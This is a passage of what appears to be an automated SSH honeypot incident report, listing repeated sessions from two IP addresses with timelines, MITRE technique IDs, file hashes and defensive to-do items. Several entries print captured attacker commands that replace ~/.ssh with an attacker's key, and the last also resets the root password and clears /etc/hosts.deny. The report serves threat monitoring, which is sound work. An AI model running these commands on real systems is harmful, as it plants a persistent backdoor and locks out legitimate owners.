| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:31:48` | `cowrie.session.connect` |
| `2026-04-07 15:31:48` | `cowrie.client.version` |
| `2026-04-07 15:31:49` | `cowrie.client.kex` |
| `2026-04-07 15:31:50` | `cowrie.login.success` |
| `2026-04-07 15:31:51` | `cowrie.session.params` |
| `2026-04-07 15:31:51` | `cowrie.command.input` |
| `2026-04-07 15:31:51` | `cowrie.command.failed` |
| `2026-04-07 15:31:51` | `cowrie.log.closed` |
| `2026-04-07 15:31:52` | `cowrie.session.params` |
| `2026-04-07 15:31:52` | `cowrie.command.input` |
| `2026-04-07 15:31:52` | `cowrie.session.file_download` |
| `2026-04-07 15:31:52` | `cowrie.log.closed` |
| `2026-04-07 15:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2797e35b3267

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:31 |
| **Last Seen** | 2026-04-07 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:31:55` | `cowrie.session.connect` |
| `2026-04-07 15:31:55` | `cowrie.client.version` |
| `2026-04-07 15:31:56` | `cowrie.client.kex` |
| `2026-04-07 15:31:57` | `cowrie.login.success` |
| `2026-04-07 15:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7885964fe4aa

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:39 |
| **Last Seen** | 2026-04-07 15:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:39:09` | `cowrie.session.connect` |
| `2026-04-07 15:39:09` | `cowrie.client.version` |
| `2026-04-07 15:39:10` | `cowrie.client.kex` |
| `2026-04-07 15:39:11` | `cowrie.login.success` |
| `2026-04-07 15:39:11` | `cowrie.session.params` |
| `2026-04-07 15:39:11` | `cowrie.command.input` |
| `2026-04-07 15:39:11` | `cowrie.command.failed` |
| `2026-04-07 15:39:12` | `cowrie.log.closed` |
| `2026-04-07 15:39:12` | `cowrie.session.params` |
| `2026-04-07 15:39:12` | `cowrie.command.input` |
| `2026-04-07 15:39:13` | `cowrie.session.file_download` |
| `2026-04-07 15:39:13` | `cowrie.log.closed` |
| `2026-04-07 15:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33caf5185145

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:39 |
| **Last Seen** | 2026-04-07 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:39:16` | `cowrie.session.connect` |
| `2026-04-07 15:39:16` | `cowrie.client.version` |
| `2026-04-07 15:39:16` | `cowrie.client.kex` |
| `2026-04-07 15:39:18` | `cowrie.login.success` |
| `2026-04-07 15:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f5ade648bc9

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:42 |
| **Last Seen** | 2026-04-07 15:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:42:46` | `cowrie.session.connect` |
| `2026-04-07 15:42:46` | `cowrie.client.version` |
| `2026-04-07 15:42:46` | `cowrie.client.kex` |
| `2026-04-07 15:42:47` | `cowrie.login.success` |
| `2026-04-07 15:42:48` | `cowrie.session.params` |
| `2026-04-07 15:42:48` | `cowrie.command.input` |
| `2026-04-07 15:42:48` | `cowrie.command.failed` |
| `2026-04-07 15:42:48` | `cowrie.log.closed` |
| `2026-04-07 15:42:49` | `cowrie.session.params` |
| `2026-04-07 15:42:49` | `cowrie.command.input` |
| `2026-04-07 15:42:49` | `cowrie.session.file_download` |
| `2026-04-07 15:42:49` | `cowrie.log.closed` |
| `2026-04-07 15:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5913778d542e

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:42 |
| **Last Seen** | 2026-04-07 15:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:42:53` | `cowrie.session.connect` |
| `2026-04-07 15:42:53` | `cowrie.client.version` |
| `2026-04-07 15:42:53` | `cowrie.client.kex` |
| `2026-04-07 15:42:54` | `cowrie.login.success` |
| `2026-04-07 15:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118fb73aa835

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:48 |
| **Last Seen** | 2026-04-07 15:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:48:21` | `cowrie.session.connect` |
| `2026-04-07 15:48:21` | `cowrie.client.version` |
| `2026-04-07 15:48:22` | `cowrie.client.kex` |
| `2026-04-07 15:48:23` | `cowrie.login.success` |
| `2026-04-07 15:48:23` | `cowrie.session.params` |
| `2026-04-07 15:48:23` | `cowrie.command.input` |
| `2026-04-07 15:48:23` | `cowrie.command.failed` |
| `2026-04-07 15:48:24` | `cowrie.log.closed` |
| `2026-04-07 15:48:24` | `cowrie.session.params` |
| `2026-04-07 15:48:24` | `cowrie.command.input` |
| `2026-04-07 15:48:25` | `cowrie.session.file_download` |
| `2026-04-07 15:48:25` | `cowrie.log.closed` |
| `2026-04-07 15:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ddd85926344

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:48 |
| **Last Seen** | 2026-04-07 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:48:28` | `cowrie.session.connect` |
| `2026-04-07 15:48:28` | `cowrie.client.version` |
| `2026-04-07 15:48:29` | `cowrie.client.kex` |
| `2026-04-07 15:48:30` | `cowrie.login.success` |
| `2026-04-07 15:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2186b131f79

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:52 |
| **Last Seen** | 2026-04-07 15:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:52:03` | `cowrie.session.connect` |
| `2026-04-07 15:52:03` | `cowrie.client.version` |
| `2026-04-07 15:52:03` | `cowrie.client.kex` |
| `2026-04-07 15:52:04` | `cowrie.login.success` |
| `2026-04-07 15:52:05` | `cowrie.session.params` |
| `2026-04-07 15:52:05` | `cowrie.command.input` |
| `2026-04-07 15:52:05` | `cowrie.command.failed` |
| `2026-04-07 15:52:05` | `cowrie.log.closed` |
| `2026-04-07 15:52:06` | `cowrie.session.params` |
| `2026-04-07 15:52:06` | `cowrie.command.input` |
| `2026-04-07 15:52:06` | `cowrie.session.file_download` |
| `2026-04-07 15:52:06` | `cowrie.log.closed` |
| `2026-04-07 15:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f7e7bccfd8b

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:52 |
| **Last Seen** | 2026-04-07 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:52:10` | `cowrie.session.connect` |
| `2026-04-07 15:52:10` | `cowrie.client.version` |
| `2026-04-07 15:52:10` | `cowrie.client.kex` |
| `2026-04-07 15:52:11` | `cowrie.login.success` |
| `2026-04-07 15:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27fe7488417a

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:53 |
| **Last Seen** | 2026-04-07 15:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:53:52` | `cowrie.session.connect` |
| `2026-04-07 15:53:52` | `cowrie.client.version` |
| `2026-04-07 15:53:52` | `cowrie.client.kex` |
| `2026-04-07 15:53:53` | `cowrie.login.success` |
| `2026-04-07 15:53:54` | `cowrie.session.params` |
| `2026-04-07 15:53:54` | `cowrie.command.input` |
| `2026-04-07 15:53:54` | `cowrie.command.failed` |
| `2026-04-07 15:53:54` | `cowrie.log.closed` |
| `2026-04-07 15:53:55` | `cowrie.session.params` |
| `2026-04-07 15:53:55` | `cowrie.command.input` |
| `2026-04-07 15:53:55` | `cowrie.session.file_download` |
| `2026-04-07 15:53:55` | `cowrie.log.closed` |
| `2026-04-07 15:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0dc33b511cc

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:53 |
| **Last Seen** | 2026-04-07 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:53:59` | `cowrie.session.connect` |
| `2026-04-07 15:53:59` | `cowrie.client.version` |
| `2026-04-07 15:53:59` | `cowrie.client.kex` |
| `2026-04-07 15:54:00` | `cowrie.login.success` |
| `2026-04-07 15:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc2f1a54d1bc

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:57 |
| **Last Seen** | 2026-04-07 15:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:57:20` | `cowrie.session.connect` |
| `2026-04-07 15:57:20` | `cowrie.client.version` |
| `2026-04-07 15:57:20` | `cowrie.client.kex` |
| `2026-04-07 15:57:21` | `cowrie.login.success` |
| `2026-04-07 15:57:22` | `cowrie.session.params` |
| `2026-04-07 15:57:22` | `cowrie.command.input` |
| `2026-04-07 15:57:22` | `cowrie.command.failed` |
| `2026-04-07 15:57:22` | `cowrie.log.closed` |
| `2026-04-07 15:57:23` | `cowrie.session.params` |
| `2026-04-07 15:57:23` | `cowrie.command.input` |
| `2026-04-07 15:57:23` | `cowrie.session.file_download` |
| `2026-04-07 15:57:23` | `cowrie.log.closed` |
| `2026-04-07 15:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33003c456243

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:57 |
| **Last Seen** | 2026-04-07 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:57:27` | `cowrie.session.connect` |
| `2026-04-07 15:57:27` | `cowrie.client.version` |
| `2026-04-07 15:57:27` | `cowrie.client.kex` |
| `2026-04-07 15:57:28` | `cowrie.login.success` |
| `2026-04-07 15:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e6052a93627

| Field | Detail |
|---|---|
| **Source IP** | `101.126.91[.]34` |
| **First Seen** | 2026-04-07 16:39 |
| **Last Seen** | 2026-04-07 16:40 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0hGQZw1STAtD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 16:39:41` | `cowrie.session.connect` |
| `2026-04-07 16:39:41` | `cowrie.client.version` |
| `2026-04-07 16:39:42` | `cowrie.client.kex` |
| `2026-04-07 16:39:43` | `cowrie.login.success` |
| `2026-04-07 16:39:43` | `cowrie.session.params` |
| `2026-04-07 16:39:43` | `cowrie.command.input` |
| `2026-04-07 16:39:43` | `cowrie.command.failed` |
| `2026-04-07 16:39:43` | `cowrie.log.closed` |
| `2026-04-07 16:39:44` | `cowrie.session.params` |
| `2026-04-07 16:39:44` | `cowrie.command.input` |
| `2026-04-07 16:39:45` | `cowrie.session.file_download` |
| `2026-04-07 16:39:45` | `cowrie.log.closed` |
| `2026-04-07 16:39:56` | `cowrie.session.params` |
| `2026-04-07 16:39:56` | `cowrie.command.input` |
| `2026-04-07 16:39:58` | `cowrie.log.closed` |
| `2026-04-07 16:39:59` | `cowrie.session.params` |
| `2026-04-07 16:39:59` | `cowrie.command.input` |
| `2026-04-07 16:39:59` | `cowrie.log.closed` |
| `2026-04-07 16:39:59` | `cowrie.session.params` |
| `2026-04-07 16:39:59` | `cowrie.command.input` |
| `2026-04-07 16:39:59` | `cowrie.session.file_download` |
| `2026-04-07 16:39:59` | `cowrie.log.closed` |
| `2026-04-07 16:40:00` | `cowrie.session.params` |
| `2026-04-07 16:40:00` | `cowrie.command.input` |
| `2026-04-07 16:40:00` | `cowrie.log.closed` |
| `2026-04-07 16:40:00` | `cowrie.session.params` |
| `2026-04-07 16:40:00` | `cowrie.command.input` |
| `2026-04-07 16:40:01` | `cowrie.log.closed` |
| `2026-04-07 16:40:01` | `cowrie.session.params` |
| `2026-04-07 16:40:01` | `cowrie.command.input` |
| `2026-04-07 16:40:01` | `cowrie.command.input` |
| `2026-04-07 16:40:01` | `cowrie.log.closed` |
| `2026-04-07 16:40:02` | `cowrie.session.params` |
| `2026-04-07 16:40:02` | `cowrie.command.input` |
| `2026-04-07 16:40:02` | `cowrie.log.closed` |
| `2026-04-07 16:40:03` | `cowrie.session.params` |
| `2026-04-07 16:40:03` | `cowrie.command.input` |
| `2026-04-07 16:40:03` | `cowrie.log.closed` |
| `2026-04-07 16:40:03` | `cowrie.session.params` |
| `2026-04-07 16:40:03` | `cowrie.command.input` |
| `2026-04-07 16:40:04` | `cowrie.log.closed` |
| `2026-04-07 16:40:04` | `cowrie.session.params` |
| `2026-04-07 16:40:04` | `cowrie.command.input` |
| `2026-04-07 16:40:04` | `cowrie.log.closed` |
| `2026-04-07 16:40:05` | `cowrie.session.params` |
| `2026-04-07 16:40:05` | `cowrie.command.input` |
| `2026-04-07 16:40:05` | `cowrie.log.closed` |
| `2026-04-07 16:40:05` | `cowrie.session.params` |
| `2026-04-07 16:40:05` | `cowrie.command.input` |
| `2026-04-07 16:40:06` | `cowrie.log.closed` |
| `2026-04-07 16:40:06` | `cowrie.session.params` |
| `2026-04-07 16:40:06` | `cowrie.command.input` |
| `2026-04-07 16:40:07` | `cowrie.log.closed` |
| `2026-04-07 16:40:07` | `cowrie.session.params` |
| `2026-04-07 16:40:07` | `cowrie.command.input` |
| `2026-04-07 16:40:07` | `cowrie.log.closed` |
| `2026-04-07 16:40:08` | `cowrie.session.params` |
| `2026-04-07 16:40:08` | `cowrie.command.input` |
| `2026-04-07 16:40:08` | `cowrie.log.closed` |
| `2026-04-07 16:40:09` | `cowrie.session.params` |
